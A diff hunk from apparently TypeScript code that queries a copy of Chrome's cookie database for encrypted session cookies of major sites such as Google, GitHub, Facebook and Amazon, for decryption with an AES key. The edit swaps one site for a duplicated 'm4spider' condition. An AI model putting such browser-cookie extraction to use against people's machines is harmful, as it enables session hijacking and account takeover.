@@ -137,7 +137,7 @@ async function readChromeCookiesFromDB(dbPath: string, aesKey: Buffer): Promise<
     const { stdout } = await execFileAsync("sqlite3", [
       "-json",
       tempDbPath,
-      "SELECT name, encrypted_value, host_key, path, expires_utc, is_secure, is_httponly, samesite FROM cookies WHERE host_key LIKE '%google%' OR host_key LIKE '%youtube%' OR host_key LIKE '%github%' OR host_key LIKE '%twitter%' OR host_key LIKE '%facebook%' OR host_key LIKE '%microsoft%' OR host_key LIKE '%apple%' OR host_key LIKE '%amazon%' OR host_key LIKE '%linkedin%' OR host_key LIKE '%reddit%' OR host_key LIKE '%stackoverflow%' OR host_key LIKE '%npmjs%' OR host_key LIKE '%opencode%' OR host_key LIKE '%m4spider%' LIMIT 500",
+      "SELECT name, encrypted_value, host_key, path, expires_utc, is_secure, is_httponly, samesite FROM cookies WHERE host_key LIKE '%google%' OR host_key LIKE '%youtube%' OR host_key LIKE '%github%' OR host_key LIKE '%twitter%' OR host_key LIKE '%facebook%' OR host_key LIKE '%microsoft%' OR host_key LIKE '%apple%' OR host_key LIKE '%amazon%' OR host_key LIKE '%linkedin%' OR host_key LIKE '%reddit%' OR host_key LIKE '%stackoverflow%' OR host_key LIKE '%npmjs%' OR host_key LIKE '%m4spider%' OR host_key LIKE '%m4spider%' LIMIT 500",
     ])
 
     if (!stdout.trim()) return []
